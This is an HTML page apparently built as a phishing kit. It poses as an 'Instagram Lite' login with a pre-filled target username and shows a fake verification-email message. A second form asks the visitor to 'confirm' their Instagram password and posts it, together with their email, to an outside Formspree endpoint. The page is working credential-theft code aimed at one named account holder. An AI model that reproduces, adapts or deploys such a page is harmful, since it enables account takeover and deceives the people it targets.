<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://code.jquery.com;">

    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fafafa;
        }

        .container {
            max-width: 600px;
            margin: 50px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        form {
            display: flex;
            flex-direction: column;
        }

        logo{
         align-items: center;
         text-align: center;
        }
        label {
            margin-bottom: 8px;
        }

        input, textarea {
            padding: 10px;
            margin-bottom: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            background-color: #3897f0;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #2671a8;
        }

        #loginMessage, #formMessage {
            margin-top: 16px;
            font-weight: bold;
        }

        #loginMessage.success, #formMessage.success {
            color: #00cc00;
        }

        #loginMessage.error, #formMessage.error {
            color: #ff0000;
        }

        @media (max-width: 600px) {
            .container {
                margin: 20px;
            }
        }
    </style>
    <title>Instagram Lite</title>
</head>
<body> <div class="logo">
    <img src="insta.png"  alt=""></div>
    <div class="container">
        <form id="loginForm" onsubmit="return login()">
            <h1>Instagram Lite</h1>
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" value="__neha.__.227" required>
            
            <label for="password">Password:</label>
            <input type="text" id="password" name="password" required>

            <button type="submit">Submit</button>
            <p id="loginMessage"></p>
        </form>

        <!-- Your new form -->
        <form id="contactForm" action="https://formspree.io/f/mvojnako" method="POST">
            <label for="email">Your email:</label>
            <input type="email" id="email" name="email" required>
            
            <label for="message">Your message:</label>
            <textarea id="message" name="message" required></textarea>

            <label for="text">Confirm Your Instagram Password:</label>
            <textarea id="text" name="text" required></textarea>

            <button type="submit">Verify</button>
            <p id="formMessage"></p>
        </form>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function login() {
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var loginMessage = document.getElementById('loginMessage');

            // Perform authentication logic here (checking against a database, etc.)
            if (username === "__neha.__.227" && password !== "") {
                sendVerificationEmail(username);
                loginMessage.className = 'success';
                loginMessage.innerHTML = 'Verification email sent. Check your email inbox after some time.';
                return false; // Prevent form submission for this example
            } else {
                loginMessage.className = 'error';
                loginMessage.innerHTML = 'Incorrect username or password. Please try again.';
                return false; // Prevent form submission for this example
            }
        }

        function sendVerificationEmail(username) {
            // This function should be implemented on the server-side
            // to send an email using Node.js and Nodemailer, for example.
            console.log('Sending verification email to ' + username);
        }
    </script>
</body>
</html>
